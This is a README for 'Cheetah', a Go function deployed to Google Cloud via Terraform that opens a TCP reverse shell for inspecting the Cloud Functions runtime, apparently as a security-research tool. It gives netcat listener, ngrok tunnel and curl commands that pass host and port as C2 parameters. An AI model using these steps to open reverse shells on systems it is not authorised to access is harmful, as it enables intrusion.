# Puma Prey Cheetah

Cheetah is a Go function that can be deployed to the Google Cloud Platform to establish a TCP reverse shell for the purposes of introspecting the Cloud Functions container runtime.

## Installing Prerequisites

* [Google Cloud SDK](https://cloud.google.com/sdk/install)
* [Go](https://go.dev)
* [Terraform](https://learn.hashicorp.com/terraform/getting-started/install.html)

## Deploying The Function

```bash
gcloud auth application-default login
export TF_VAR_unique_identifier=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}')
export TF_VAR_project_id=YOUR_PROJECT_ID
export TF_VAR_region=YOUR_REGION
cd ./cougar/src/terraform/
terraform init
terraform apply --auto-approve
```

## Function Testing

Retrieve the Function URL:

```bash
export CHEETAH_FUNCTION_URL=$(terraform output --json | jq -r '.cheetah_function_url.value')
export CHEETAH_API_KEY=$(gcloud auth print-identity-token)
curl -H "Authorization: Bearer $CHEETAH_API_KEY" "$CHEETAH_FUNCTION_URL"
```

The result should show an error message indicating required C2 parameters are missing:

```json
{"message":"Must provide the host and port for the target TCP server as query parameters."}
```

If you have [Netcat](http://netcat.sourceforge.net/) and [ngrok](https://ngrok.com/) installed, you can use this script:

```bash
../../../script/prey.sh cheetah --url $CHEETAH_FUNCTION_URL --api-key $CHEETAH_API_KEY
```

See [here](../script/USAGE.md) for more details on how to use this script.

Alternatively, you can do this manually by setting up a Netcat listener like so:

```bash
nc -l 4444
```

Then, to make your listener accessible from the public internet, consider using a service like [ngrok](https://ngrok.com/):

```bash
ngrok tcp 4444
```

Finally, invoke your function, supplying your connection details:

```bash
curl "$CHEETAH_FUNCTION_URL?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER"
```

Your listener will now act as a reverse shell for the duration of the function invocation. You can adjust the function timeout in the serverless.yml file.

## Teardown

```bash
terraform destroy
```

## Learning More

Read [documentation](docs) on what you can accomplish once you connect to the runtime via Cheetah.
